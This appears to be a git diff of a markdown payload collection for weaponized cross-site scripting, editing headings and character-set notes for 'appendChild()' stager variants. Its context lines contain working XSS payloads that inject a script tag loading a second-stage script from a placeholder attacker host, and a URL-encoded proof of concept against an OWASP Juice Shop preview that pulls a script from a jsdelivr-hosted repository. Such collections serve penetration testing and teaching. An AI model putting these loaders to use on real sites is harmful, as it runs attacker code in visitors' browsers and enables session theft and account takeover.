@@ -25,7 +25,7 @@ In case the second stage payload is hosted on GitHub (`Content-Type: text/plain`
 * contains:
     * round brackets
     * quote
-* NOTES:
+* NOTE:
     * `Access-Control-Allow-Origin` required
 
 ```
@@ -84,10 +84,13 @@ with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3B%22%3E
 
-## `appendChild()` #2 - round brackets; quote; equal; space
+## `appendChild()` #2
 
 * contains:
-    * 
+    * round brackets
+    * quote
+    * equal
+    * space
 
 ```
 var js=document.createElement('script');js.type='text/javascript';js.src='//ATTACKER_WS/PATH/JS_PAYLOAD';document.body.appendChild(js);
